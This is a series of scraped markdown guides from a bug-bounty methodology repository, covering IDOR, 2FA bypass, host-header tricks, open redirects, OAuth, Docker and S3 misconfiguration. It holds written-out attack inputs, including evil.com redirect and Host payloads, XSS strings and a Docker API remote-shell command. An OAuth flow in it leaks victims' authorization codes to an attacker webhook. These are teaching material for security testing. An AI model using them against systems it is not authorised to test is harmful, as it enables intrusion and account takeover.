`\n    \n2. [Burp_smuggler](https://github.com/PortSwigger/http-request-smuggler) (also available in BApp store)  \n\n## More Info:  \n\n### Topics  \n\nhttps://paper.seebug.org/1049/ (Recommended !)  \n\n[Portswigger Topic](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn)  \n\n[Portswigger Lab](https://portswigger.net/web-security/request-smuggling)  \n\n### Reports (Hackerone):  \n\n[Report 1](https://hackerone.com/reports/737140)  \n\n[Report 2](https://hackerone.com/reports/867952)  \n\n[Report 3](https://hackerone.com/reports/498052)  \n\n[Report 4](https://hackerone.com/reports/526880)\n\n[Report 5](https://hackerone.com/reports/771666)  \n\n[Report 6](https://hackerone.com/reports/753939)  \n\n[Report 7](https://hackerone.com/reports/648434 )  \n\n[Report 8](https://hackerone.com/reports/740037)  \n\n## Writeups (Medium.com):  \n\n[Article 1](https://medium.com/@ricardoiramar/the-powerful-http-request-smuggling-af208fafa142)  \n\n[Article 2](https://medium.com/cyberverse/http-request-smuggling-in-plain-english-7080e48df8b4)  \n\n[Article 3](https://medium.com/@cc1h2e1/write-up-of-two-http-requests-smuggling-ff211656fe7d)  \n\n[Article 4](https://medium.com/bugbountywriteup/crossing-the-borders-the-illegal-trade-of-http-requests-57da188520ca)  \n\n## Extra:  \n\n[A Brief Video About Req. Smuggling](https://youtu.be/gzM4wWA7RFo)\n\n### Author:\n[Neutron__](https://twitter.com/Neutron__)\n###### If you think something was missed, feel free to add/modify/delete it :)\n", "timestamp": "2025-10-21T22:02:07.502450"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Host-Header/Host-Header.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Host-Header/Host-Header.md", "content": "# Summary For Host Header\n![https://pbs.twimg.com/media/ET39wJOWoAAfTBb?format=jpg&name=small](https://pbs.twimg.com/media/ET39wJOWoAAfTBb?format=jpg&name=small)\n\n# Also Check This Things While Testing\n1. Add two `HOST:` in Request.\n2. Try this Headers\n    ```      \n       X-Original-Url:\n       X-Forwarded-Server:\n       X-Host:\n       X-Forwarded-**Host**:\n       X-Rewrite-Url:\n    ```\n3. If you come across `/api.json` in any AEM instance during bug hunting, try for web cache poisoning via following  \n  `Host: , X-Forwarded-Server , X-Forwarded-Host:`\n   and or simply try https://localhost/api.json HTTP/1.1\n4. Also try `Host: redacted.com.evil.com`\n5. Try Host: evil.com/redacted.com\n[https://hackerone.com/reports/317476](https://hackerone.com/reports/317476)\n6. Try this too `Host: example.com?.mavenlink.com`\n7. Try `Host: javascript:alert(1);` Xss payload might result in debugging mode.\n[https://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html](https://blog.bentkowski.info/2015/04/xss-via-host-header-cse.html)\n8. Host Header to Sqli\n[https://blog.usejournal.com/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610](https://blog.usejournal.com/bugbounty-database-hacked-of-indias-popular-sports-company-bypassing-host-header-to-sql-7b9af997c610)\n9. Bypass front server restrictions and access to forbidden files and directories through `X-Rewrite-Url/X-original-url:` \n   `curl -i -s -k -X 'GET' -H 'Host: <site>' -H 'X-rewrite-url: admin/login' 'https://<site>/'.`\n\n\n## Author:\n* [@KathanP19](https://twitter.com/KathanP19)\n", "timestamp": "2025-10-21T22:02:08.091167"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "IDOR/IDOR-Old.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR-Old.md", "content": "## Testing for IDOR/Broken object level authorization:\n\nDifficulty: Easy \n\nTips: Don't blindly test for changing numbers till you get PII, tools can do this for you\n\n**Finding IDOR Attack Vectors Ideas:**\n\n1. What  do they use for authorization?(JWT, API Keys, cookies, tokens) Tip: Find this out by replacing high privaledge authorization with lower privaledge authorization and seeing what the server responds with\n2. Understand how they use ID's, hashes, and their API. Do this by looking at the API Documentations if they have one.\n\n***Every time you see a new API endpoint that receives an object ID from the client, ask yourself the following questions:***\n\n- Does the ID belong to a private resource? (e.g /api/user/123/news vs  /api/user/123/transaction)\n- What are the IDs that belong to me?\n- What are the different possible roles in the API?(For example — user, driver, supervisor, manager)\n\n## Bypassing Object Level Authorization:\n\n- Add parameters onto the endpoints for example, if there was\n\n```html\nGET /api_v1/messages --> 401\nvs \nGET /api_v1/messages?user_id=victim_uuid --> 200\n```\n\n- HTTP Parameter pollution\n\n```html\nGET /api_v1/messages?user_id=VICTIM_ID --> 401 Unauthorized\nGET /api_v1/messages?user_id=ATTACKER_ID&user_id=VICTIM_ID --> 200 OK\n\nGET /api_v1/messages?user_id=YOUR_USER_ID[]&user_id=ANOTHER_USERS_ID[]\n```\n\n- Add .json to the endpoint, if it is built in Ruby!\n\n```html\n/user_data/2341 --> 401 Unauthorized\n/user_data/2341.json --> 200 OK\n```\n\n- Test on outdated API Versions\n\n```html\n/v3/users_data/1234 --> 403 Forbidden\n/v1/users_data/1234 --> 200 OK\n```\n\n* Wrap the ID with an array.\n\n```html\n{“id”:111} --> 401 Unauthriozied\n{“id”:[111]} --> 200 OK\n```\n\n* Wrap the ID with a JSON object:\n\n```html\n{“id”:111} --> 401 Unauthriozied\n\n{“id”:{“id”:111}} --> 200 OK\n```\n\n* JSON Parameter Pollution:\n\n```html\nPOST /api/get_profile\nContent-Type: application/json\n{“user_id”:<legit_id>,”user_id”:<victim’s_id>}\n```\n\n- Try to send a wildcard(*) instead of an ID. It’s rare, but sometimes it works.\n- If it is a number id, be sure to test through a large amount of numbers, instead of just guessing\n- If endpoint has a name like /api/users/myinfo, check for /api/admins/myinfo\n- Replace request method with GET/POST/PUT\n- Use burp extension autorize\n- If none of these work, get creative and ask around!\n\n## Escalating/Chaining with IDOR's Ideas:\n\n1.  Lets say you find a low impact IDOR, like changing someone elses name, chain that with XSS and you have stored XSS!\n2. If you find IDOR on and endpoint, but it requires UUID, chain with info disclosure endpoints that leak UUID, and bypass this!\n3. If none of these work, get creative and ask around!\n\n### Reference\n[https://twitter.com/swaysThinking/status/1301663848223715328](https://twitter.com/swaysThinking/status/1301663848223715328)\n\n### Reports (Hackerone)\n\n#### Resolved\n\n- [IDOR to delete images from other stores](https://hackerone.com/reports/404797)\n- [IDOR in changing shared file name](https://hackerone.com/reports/547663)\n- [User uploaded portfolio files can be accessed by any user even after deleted](https://hackerone.com/reports/300179)\n- [IDOR and statistics leakage in Orders](https://hackerone.com/reports/544329)\n- [I.D.O.R To Order,Book,Buy,reserve On YELP FOR FREE (UNAUTHORIZED USE OF OTHER USER'S CREDIT CARD)](https://hackerone.com/reports/391092)\n- [IDOR allow access to payments data of any user](https://hackerone.com/reports/751577)\n- [IDOR allow to extract all registered email](https://hackerone.com/reports/302485)\n- [IDOR at https://account.mackeeper.com/at/load-reports/profile/<profile_id> leaks information about devices/licenses](https://hackerone.com/reports/783117)\n- [IDOR bug to See hidden slowvote of any user even when you dont have access right](https://hackerone.com/reports/661978)\n- [IDOR on update user preferences](https://hackerone.com/reports/854290)\n- [idor on upload profile functionality](https://hackerone.com/reports/741683)\n- [IDOR to view User Order Information](https://hackerone.com/reports/287789)\n- [IDOR with Geolocation data not stripped from images](https://hackerone.com/reports/906907)\n- [Replace other user files in Inbox messages](https://hackerone.com/reports/322661)\n\n### Author\n\n* [@harsha0x01](https://twitter.com/harsha0x01)\n* [@klaus](https://twitter.com/klaus_dev)\n", "timestamp": "2025-10-21T22:02:08.649180"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "IDOR/IDOR.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR.md", "content": "# IDOR\n\n- At its core, an IDOR is an access control vulnerability in which an application relies on user-supplied input to reference objects directly. In this case, the object could be a picture, a comment on a post, personally identifiable information (PII) associated with a user or even an entire department within an organization.\n- Insecure Direct Object References occur when an application provides direct access to objects based on user-supplied input. As a result of this vulnerability attackers can bypass authorization and access resources in the system directly, for example database records or files. Insecure Direct Object References allow attackers to bypass authorization and access resources directly by modifying the value of a parameter used to directly point to an object. Such resources can be database entries belonging to other users, files in the system, and more.\n- IDORs can exist throughout the entire application so it is always suggested that if you see IDs then to always test, even if they are guids or some type of \"encrypted id\". Look for potential leaks of this ID (public profile?) or look for patterns and see if you can generate your own & run it through burp intruder.\n\n## Types of IDOR you will see in wild:\n\n1. The value of a parameter is used directly to retrieve a database record\n    \n    ```markdown\n    http://foo.bar/somepage?invoice=12345\n    ```\n    \n2. The value of a parameter is used directly to perform an operation in the system\n    \n    ```markdown\n    http://foo.bar/changepassword?user=someuser\n    ```\n    \n3. The value of a parameter is used directly to retrieve a file system resource\n    \n    ```markdown\n    http://foo.bar/showImage?img=img00011\n    ```\n    \n4. The value of a parameter is used directly to access application functionality\n    \n    ```markdown\n    http://foo.bar/accessPage?menuitem=12\n    ```\n    \n\n# Testing for IDOR - ( Manual-Method ):\n\n## **Base Steps:**\n\n```markdown\n1. Create two accounts if possible or else enumerate users first. \n2. Check if the endpoint is private or public and does it contains any kind of id param.\n3. Try changing the param value to some other user and see if does anything to their account.\n4. Done !!\n```\n\n## Testcase - 1: Add IDs to requests that don’t have them\n\n```jsx\nGET /api/MyPictureList → /api/MyPictureList?user_id=<other_user_id>\n\nPro tip: You can find parameter names to try by deleting or editing other objects and seeing the parameter names used.\n```\n\n## Testcase - 2: Try replacing parameter names\n\n```jsx\nInstead of this:\nGET /api/albums?album_id=<album id>\n\nTry This:\nGET /api/albums?account_id=<account id>\n\nTip: There is a Burp extension called Paramalyzer which will help with this by remembering all the parameters you have passed to a host.\n```\n\n## Testcase - 3: Supply multiple values for the same parameter.\n\n```jsx\nInstead of this:\nGET /api/account?id=<your account id> →\n\nTry this:    \nGET /api/account?id=<your account id>&id=<admin's account id>\n\nTip: This is known as HTTP parameter pollution. Something like this might get you access to the admin’s account\n```\n\n## Testcase - 4: Try changing the HTTP request method when testing for IDORs\n\n```jsx\nInstead of this:\nPOST /api/account?id=<your account id> →\n\nTry this:    \nPUT /api/account?id=<your account id>\n\nTip: Try switching POST and PUT and see if you can upload something to another user’s profile. For RESTful services, try changing GET to POST/PUT/DELETE to discover create/update/delete actions.\n```\n\n## Testcase - 5: Try changing the request’s content type\n\n```jsx\nInstead of this:\n```\nPOST /api/chat/join/123\n[…]\nContent-type: application/xml → \n<user>test</user>    \n```\nTry this:\n```\nPOST /api/chat/join/123\n[…]\nContent-type: application/json\n{“user”: “test”}\n```\n\nTip: Access controls may be inconsistently implemented across different content types. Don’t forget to try alternative and less common values like text/xml, text/x-json, and similar.\n```\n\n## Testcase - 6: Try changing the requested file type (Test if Ruby)\n\n```jsx\nExample:\n\nGET /user_data/2341 --> 401 Unauthorized\n\nGET /user_data/2341.json --> 200 OK\n\nTip: Experiment by appending different file extensions (e.g. .json, .xml, .config) to the end of requests that reference a document.\n```\n\n## Testcase - 7: Does the app ask for non-numeric IDs? Use numeric IDs instead\n\n```jsx\nThere may be multiple ways of referencing objects in the database and the application only has access controls on one. \nTry numeric IDs anywhere non-numeric IDs are accepted:\nExample:\n\nusername=user1 → username=1234\naccount_id=7541A92F-0101-4D1E-BBB0-EB5032FE1686 → account_id=5678\nalbum_id=MyPictures → album_id=12\n```\n\n## Testcase - 8: Try using an array\n\n```markdown\nIf a regular ID replacement isn’t working, try wrapping the ID in an array and see if that does the trick. For example:\n\n{“id”:19} → {“id”:[19]}\n```\n\n## Testcase - 9: Wildcard ID\n\n```markdown\nThese can be very exciting bugs to find in the wild and are so simple. Try replacing an ID with a wildcard. You might get lucky!\n\nGET /api/users/<user_id>/ → GET /api/users/*\n```\n\n## Testcase - 10: Pay attention to new features\n\n```markdown\nIf you stumble upon a newly added feature within the web app, such as the ability to upload a profile picture for an upcoming charity event, and it performs an API call to:\n\n/api/CharityEventFeb2021/user/pp/<ID>\n\nIt is possible that the application may not enforce access control for this new feature as strictly as it does for core features.\n```\n\n# Testing For IDOR - ( Automated Method ):\n\n[Finding Broken Access Controls](https://threat.tevora.com/finding-broken-access-controls/)\n\n[PimpMyBurp #1 - PwnFox + Autorize: The perfect combo to find IDOR - Global Bug Bounty Platform](https://blog.yeswehack.com/yeswerhackers/pimpmyburp-pwnfox-autorize-find-idor/)\n\n[Automating BURP to find IDORs](https://medium.com/cyberverse/automating-burp-to-find-idors-2b3dbe9fa0b8)\n\n# Reference:\n\n[Everything You Need to Know About IDOR (Insecure Direct Object References)](https://medium.com/@aysebilgegunduz/everything-you-need-to-know-about-idor-insecure-direct-object-references-375f83e03a87)\n\n[Finding more IDORs - Tips and Tricks | Aon](https://www.aon.com/cyber-solutions/aon_cyber_labs/finding-more-idors-tips-and-tricks/)\n\n[KathanP19/HowToHunt](https://github.com/KathanP19/HowToHunt/blob/master/IDOR/IDOR-Old.md)\n\n[Learn about Insecure Object Reference (IDOR) | BugBountyHunter.com](https://www.bugbountyhunter.com/vulnerability/?type=idor)\n\n[WSTG - v4.2](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/05-Authorization_Testing/04-Testing_for_Insecure_Direct_Object_References.html)\n\n[IDOR (Insecure Direct Object Reference)](https://notes.mufaddal.info/web/idor)\n\n[What I learnt from reading 220* IDOR bug reports.](https://medium.com/@Sm9l/what-i-learnt-from-reading-220-idor-bug-reports-6efbea44db7)\n\n### Medium:\n\n[Full account takeover worth $1000 Think out of the box](https://mokhansec.medium.com/full-account-takeover-worth-1000-think-out-of-the-box-808f0bdd8ac7)\n\n[All About Getting First Bounty with IDOR](https://infosecwriteups.com/all-about-getting-first-bounty-with-idor-849db2828c8)\n\n[](https://codeburst.io/hunting-insecure-direct-object-reference-vulnerabilities-for-fun-and-profit-part-1-f338c6a52782)\n\n[IDOR that allowed me to takeover any users account.](https://vedanttekale20.medium.com/idor-that-allowed-me-to-takeover-any-users-account-129e55871d8)\n\n[All About IDOR Attacks](https://betterprogramming.pub/all-about-idor-attacks-64c4203b518e)\n\n[Access developer tasks list of any of Facebook Application (GraphQL IDOR)](https://amineaboud.medium.com/access-developer-tasks-list-of-any-of-facebook-application-graphql-idor-62307c5e5b34)\n\n# Tips\n```\n#1 https://twitter.com/M0_SADAT/status/1361289751597359105\nLooking for high impact IDOR?\nAlways try to find the hidden parameters for this endpoints using Arjun and Parameth\n/settings/profile\n/user/profile\n/user/settings\n/account/settings\n/username\n/profile\nAnd any payment endpoint\n```\n`Pro tip: Don’t forget to try create/update/delete operations on objects that are publicly readable but shouldn’t be writable. Can you PUT to /api/products and change a price?`\n\n## Author\n[KathanP19](https://twitter.com/KathanP19)\n", "timestamp": "2025-10-21T22:02:08.750136"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "MFA_Bypasses/2FA_Bypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/MFA_Bypasses/2FA_Bypass.md", "content": "# 2FA Bypass\n\n* 1:- Password Reset Disable 2FA\t\n* 2:- No Rate limit\n* 3:- Sending all alphabets instead of number\n* 4:- Status Code Manipulation\n* 5:- 2FA bypass by substituting part of the request from the session of another account. \n    ```\n    If a parameter with a specific value is sent to verify the code in the request, try sending the value from the request of another account.\n    \n    For example, when sending an OTP code, the form ID/user ID or cookie is checked, which is associated with sending the code. If we apply the data from the parameters of the account on which you want to bypass code verification (Account 1) to a session of a completely different account (Account 2), receive the code and enter it on the second account, then we can bypass the protection on the first account. After reloading the page, 2FA should disappear.\n    ```\n * 6:- Bypass 2FA using the “memorization” functionality.\n\t\t\n    `Many sites that support 2FA, have a “remember me” functionality. It is useful when the user doesn’t want to enter a 2FA code on subsequent login windows. And it is important to identify the way in which 2FA is “remembered”. This can be a cookie, a value in session/local storage, or simply attaching 2FA to an IP address.`\n * 7:- OTP Leakage in Response\n * 8:- Bypassing 2fa Via OAuth mechanism ( Mostly not Applicable one )\n\t\t\n    `Site.com requests Facebook for OAuth token > Facebook verifies user account > Facebook send callback code > Site.com logs a user in (Rare case)`\n * 9:- Bypassing 2fa using response manipulation\n   ```\n   Enter correct OTP -> Intercept & capture the response -> logout -> enter wrong OTP -> Intercept & change the response with successful previous response -> logged in\n   ```\n * 10:- CSRF on 2FA Disable Feature.\n    ```\n    Signup for two account -> Login into attacker account & capture the disable 2FA request -> generate CSRF POC with .HTML extension -> Login into victim account and fire the request — — -> It disable 2FA which leads to 2FA Bypass.\n    ```\n * 11:- Bypass 2FA by Adding null or 000000\n * 12:- Bypass 2FA by Batch API request\n    ```\n    Suppose if 2FA parameter like \"code\" of \"OTP\" is going with the request, add same parameter into the request multiple times like BATCH Mode for REST APi.\n    ```\n\n* https://twitter.com/FaniMalikHack/status/1395042756108505092\n* https://twitter.com/FaniMalikHack/status/1402627994833805313\n\n## Twitte :- [Fani Malik](https://twitter.com/FaniMalikHack)\n", "timestamp": "2025-10-21T22:02:10.600695"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Misconfigurations/Default_Credential_And_Admin_Panel.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Misconfigurations/Default_Credential_And_Admin_Panel.md", "content": "\n## Default Credentials Basics\n\n- Default Software Configurations for admin console of webapp\n```\nhttps://www.target.com/admin\nhttps://www.target.com/admin-console\nhttps://www.target.com/console\nhttps://admin.target.com\nhttps://admin-console.target.com\nhttps://console.target.com\n```\n\n## 1. Getting access through third party services\n\n* When the admin console login page is working on a third party service,then just search for it's default credentials on Google\n* Third Party service URL are of the format: https://target.<TPS Name>.com/login\n* Some examples are Okta,WP etc\n\n## 2. Bypass to get access to login page\n```\n1. This bypass is used when you are forbidden to get access to admin login page\n2. We use Header Injection for this bypass\n3. `X-Orginal-URL: /admin` or `X-Rewrite-URL:/admin`\n4. Use this Header under Host\n\n* Use Burp to capture then check\n```\n## Hackerone Reports :\n- https://hackerone.com/reports/192074\n- https://hackerone.com/reports/174883\n- https://hackerone.com/reports/398797\n\n## Reference : \nhttps://www.owasp.org/index.php/Testing_for_default_credentials_(OTG-AUTHN-002)\nhttps://www.owasp.org/index.php/Testing_for_Default_or_Guessable_User_Account_(OWASP-AT-003)\n\n## Author:\n* [@e11i0t_4lders0n](https://twitter.com/e11i0t_4lders0n)\n", "timestamp": "2025-10-21T22:02:11.307072"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Misconfigurations/Docker.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Misconfigurations/Docker.md", "content": "# Docker API unauthorized RCE\n- Docker is an open-source platform for developers and other IT professionals to help build, ship, and run distributed applications.\nthe docker daemon (dockerd) provides an API service used for remote control of docker service the default daemon listen on Unix /var/run/docker.sock and when bound to a public interface can be used by an attacker to compromise container system due to lack of default authentication\n\n## Background concept:\n\n- The host is running docker: daemon bound to the external interface with no access control or authentication\n- Attacker uses docker API function to enumerate manage and control the container service the attacker is able to control existing deployed container or create another one.\n- Docker API provides JSON response containing the output of command issued.\n- Enumerating docker API services\n- By default, the Docker host remote API listens on ports 2375 / 2376 and has no authentication. If the port is not blocked, docker host APIs can be accessed over the public internet.\n\n```\nnmap IP:2375/2376\nnmap -p- IP\nnmap -Pn -p 2375 IP\nnmap -sV -p 2375 IP\n```\n- To confirm that the docker is service is running on the target we can give the string in the browser and check the response\nex: `https://IP:2375`\n- we will receive a response something like this\n`{\"message\":\"page not found\"}`\n- and to confirm the version details we can use this\n`https://IP:2375/version`\n\n- The command used to exploit\n\n- This command is used to get all the information about the docker container\n`docker -H IP:2375 info`\n\n- List all the running containers\n`docker -H IP:2375 ps`\n\n- List all the stopped containers\n`docker -H IP:2375 ps -a`\n\n- Docker command for RCE\n`docker -H IP:2375 exec -it container_name /bin/bash`\n\n## Contributor:\n- [N3T_hunt3r](https://twitter.com/N3T_hunt3r)\n", "timestamp": "2025-10-21T22:02:11.414578"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Misconfigurations/S3-Bucket_Misconfig.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Misconfigurations/S3-Bucket_Misconfig.md", "content": "\n##  How to check for amazon S3 Bucket Misconfiguration.\n* First of all, you need to install aws cli - `Pip install awscli`\n* Dont Forget to Set:\n\\- Access key \n\\- Secret key\n\n**1.** **Check is you can list iteams from the bucket.** \n`aws s3 ls s3://<bucket name>`\n* See if you are able to access that bucket.\n* If the bucket is not accessible, still we can try to exploit it.\n\n* If you are getting some errors then run this command \n`aws s3 ls s3://<bucket name> --no-sign-request`\n\n**2. Try moving the files or deleting it and see if you are able to do that or not** \n* If it is possible to move files then it is vulnerable and you can report it otherwise it is not vulnerable\n* First Make a file \n`echo \"Testing purpose\" >> test.txt `\n* Now try command to move the file into the bucket. \n`aws s3 mv test.txt s3://<bucket name>`\n* Also try command to copy the file from local drive to the S3 bucket. \n`aws s3 cp test.txt s3://[bucketname]/test.txt`\n\n**3.  Delete files from the bucket.**\n* Command to delete the file into the bucket\n`aws s3 rm test.txt s3://<bucket name>/test.txt` *(if that is present)*\n\n\n## References :\n * [Hackerone Report](https://hackerone.com/reports/700051) \n * [Hackerone Report](https://hackerone.com/reports/229690) \n * [https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn](https://bugbountypoc.com/s3-bucket-misconfiguration-from-basics-to-pawn)\n \n## Author :\n * [Anishka Shukla](https://twitter.com/AnishkaShukla)\n * [Anubhav Singh](https://twitter.com/AnubhavSingh_)\n", "timestamp": "2025-10-21T22:02:11.516270"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "OAuth/OAuth 2.0 Hunting Methodology.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/OAuth/OAuth%202.0%20Hunting%20Methodology.md", "content": "## OAuth 2.0 Hunting Methodology\nIn OAuth there are 2 types of flows/grant types:\n- Authorization code flow\n- Implicit flow\n\nNote: *if the oauth service uses authorization code flow then there is little to no chance of finding a bug but if the oauth service uses implicit flow then there is a good chance of finding bugs*\n\n## How to differentiate between implicit and authorization code grant type\n\n### <ins>Authorization code grant type</ins>\n\n**Authorization request**\n- When you send an authorization request to the oauth service in the client application , The client application sends a request to the OAuth service's `/authorization` endpoint asking for permission to access specific user data.\n\n> Note: the endpoint name can be different according to the application like `/auth` etc. but you can identify them based on the parameters used.\n\n- The request in authorization code flow looks like:\n\n```\nGET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=code&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 \nHost: oauth-authorization-server.com\n```\n\n- So, in authorization code grant type the `response_type` parameter should be `code` . this code is used to request access token from the oauth service.\n\n- Now, after the user login to their account with the OAuth provider and gives consent to access their data. the user will be redirected to the `/callback` endpoint that was specified in the `redirect_uri` parameter of the authorization request. The resulting `GET` request will contain the authorization code as a query parameter.\n\n**Authorization code grant**\n\n```\nGET /callback?code=a1b2c3d4e5f6g7h8&state=ae13d489bd00e3c24 HTTP/1.1 \nHost: client-app.com\n```\n\n- Rest of the stuff like access token grant and API calls are done in the back-end so you cannot see them in your proxy.\n\n```md\n**factors that determine authorization code flow:**\n- Initial authorization request has `response_type=code`\n- the `/callback` request contains authorization code as a parameter.\n```\n\n### <ins>Implicit grant type</ins>\n\n**Authorization request**\n- The implicit flow starts in pretty much the same way as the authorization code flow. The only major difference is that the `response_type` parameter must be set to `token`.\n\n```\nGET /authorization?client_id=12345&redirect_uri=https://client-app.com/callback&response_type=token&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 \nHost: oauth-authorization-server.com\n```\n\n**Access Token grant**\n\n- If the user logs in and gives their consent to the request access , the oauth service redirects the user to the `/callback` endpoint but instead of sending a parameter containing an authorization code, it will send the access token and other token-specific data as a URL fragment.\n\n```\nGET /callback#access_token=z0y9x8w7v6u5&token_type=Bearer&expires_in=5000&scope=openid%20profile&state=ae13d489bd00e3c24 HTTP/1.1 \nHost: client-app.com\n```\n\n\n```md\n**factors that determine Implicit flow:**\n- Initial authorization request has `response_type=token`\n- the `/callback` request contains access token as a parameter.\n```\n\n---\n\n*Now that you have determined which grant type the OAuth service uses , you can proceed to find bugs.*\n\n### Method-1 (Auth bypass in OAuth implicit flow)\n- To log the user in every time with oauth , the client application sends a POST request to the server containing user info (email-id, username) and access token to generate a session cookie.\n\t- so, find a POST req in http history which contains user-info and access token.\n- Usually in implicit flow , the server doesn't validate the access token so you can change the parameters like email-id and/or username to impersonate another user and bypass authentication.\n\n### Method-2 (Forced profile linking)\n- This is similar to a traditional CSRF attack so the impact may not be that much.\n- In this when you sign in with social media profile, you will be redirected to the social media website and then you log in with social media credentials.\n- Now the next time when you log in , you will be logged in instantly. capture this request with burp.\n- In the http history there would be a request similar to `/auth?client_id[...]` . In that request the redirect_uri sends the authorization code to something like `/oauth-linking`. Check if the `state` parameter is present. if its not present then it is vulnerable to CSRF attacks. because that means there is no way for server to verify if this information is from the same user.\n- So absence of `state` parameter in this request is itself a vulnerability.\n- Past this you can try sending the exploit link to the victim and complete the oauth flow by attaching your social media profile to their account.\n\t- For this copy URL of the request in burp and drop the request so that the code isn't used.\n\t- Turn off intercept and log out of website.\n\t- Now you can send this link to the victim or you can set it as an iframe on your website `<iframe src=\"request URL\"></iframe>`.  and deliver your website link to the victim.\n\t- When their browser loads the `iframe`, it will complete the OAuth flow using your social media profile, attaching it to the victim account.\n\n### Method-3 (Account hijacking via redirect_uri)\n- Complete the oauth sign in flow and log out then log back in and you will be logged in instantly this time.\n- Find the most recent Authorization request in http history, it should be similar to `GET /auth?client_id=[...]`.\n- Check the redirect_uri param and try to change it. If you can redirect it to an external site then good , if not then try different endpoints on the same website and check if they work.\n- if there is an open redirect then change the redirect_uri to your webhook site link and follow the redirect. \n- Now check for a log entry in webhook.site containing an authorization code.\n- So now you can send the request url to the victim (or make an iframe as mentioned above) with redirect_uri set as your webhook site and leak their authorization codes.\n- If the victim clicks on the link then you would see the authorization code in your webhook.site logs.\n- now you can use this stolen code in the callback request and the rest of the OAuth flow will be completed automatically and you will be logged in as the admin user.\n\n## Author:\n[Pyr0sec](https://twitter.com/Pyr0sec)\n", "timestamp": "2025-10-21T22:02:12.077605"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Open_Redirection/Open_Redirection_Bypass.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Open_Redirection/Open_Redirection_Bypass.md", "content": "# Open Redirection Bypass Trick:\n\nThis bypass I found in a application while I doing pentesting. I hope it will helps you too!\n\n1. While you I trying to redirect https://targetweb.com?url=http://attackersite.com it did not redirected!\n2. I Created a new subdomain with with www.targetweb.com.attackersite.com\n3. And when I tried to redirect with https://targetweb.com?url=www.targetweb.com.attackersite.com\n4. It will successfully redirected to the www.targetweb.com.attackersite.com website!\n5. Due to the bad regex it has been successfully bypass their protection!\n\n### Authors:\n* [@bishal0x01](https://twitter.com/bishal0x01)\n\n### Reference Tweets:\n* https://twitter.com/bishal0x01/status/1262021038080053248\n", "timestamp": "2025-10-21T22:02:12.721261"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Open_Redirection/find_OpenRedirect_trick.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Open_Redirection/find_OpenRedirect_trick.md", "content": "## A small trick to find Open Redirection if you couldn't find any Redirection parameters.\n\n*\"I apply this everytime while testing web applications and found many Open Redirects and even an XSS using this trick!\"*\n\n### Steps:\n------------------------------------------------------------------------------------------------------------------------------------------------------------\n      1. If the Applictaion have a user Sign-In/Sign-Up feature, then register a user and log in as the user.\n      \n      2. Go to your user profile page , for example : samplesite.me/accounts/profile\n      \n      3. Copy the profile page's URL\n      \n      4. Logout and Clear all the cookies and go to the homepage of the site.\n      \n      5. Paste the Copied Profile URL on the address bar \n      \n      6. If the site prompts for a login , check the address bar , you may find the login page with a redirect parameter like the following\n            - https://samplesite.me/login?next=accounts/profile\n            - https://samplesite.me/login?retUrl=accounts/profile\n      \n      7. Try to exploit the parameter by adding an external domain and load the crafted URL\n          eg:- https://samplesite.me/login?next=https://evil.com/\n                         (or)\n            https://samplesite.me/login?next=https://samplesite.me@evil.com/  #(to beat the bad regex filter)\n      \n      8. If it redirects to evil.com , thers's your open redirection bug.\n       \n      9. Try to leverage it to XSS\n           eg:- https://samplesite.me/login?next=javascript:alert(1);//\n\n-------------------------------------------------------------------------------------------------------------------------------------------------------------\n       \n #### Author:  [febinrev](https://twitter.com/febinrev) \n", "timestamp": "2025-10-21T22:02:12.842006"}
{"source": "github", "repo": "KathanP19/HowToHunt", "file": "Parameter_Pollution/Parameter_Pollution_in_social_sharing_buttons.md", "url": "https://github.com/KathanP19/HowToHunt/blob/master/Parameter_Pollution/Parameter_Pollution_in_social_sharing_buttons.md", "content": "# Parameter Pollution in social sharing buttons\n\nHi Guys,\nThough it is not severe bug.But still some organizations take this seriously.\n\n## Steps :\n\n```\n1.Browse through your target.\n  say https://target.com\n2.Find a article or blog present on target website which must have a link to share that blog on different social networks such as\n  Facebook,Twitter etc.\n3.Let's say we got and article with url:\n  https://taget.com/how-to-hunt \n  then just appened it with payload ?&u=https://attacker.com/vaya&text=another_site:https://attacker.com/vaya\n  so our url will become \n  https://taget.com/how-to-hunt?&u=https://attacker.com/vaya&text=another_site:https://attacker.com/vaya\n4.Now hit enter with the abover url and just click on share with social media.\n  Just observe the content if it is including our payload i.e. https://attacker.com\n  Then it is vulnerable or else try next target.\n```  \n## References:\n* https://hackerone.com/reports/105953\n* Google\n  \n## Author\n* [KenAdams000](https://twitter.com/KenAdams000)\n", "timestamp": "2025-10-21T22:02:13.395006"}
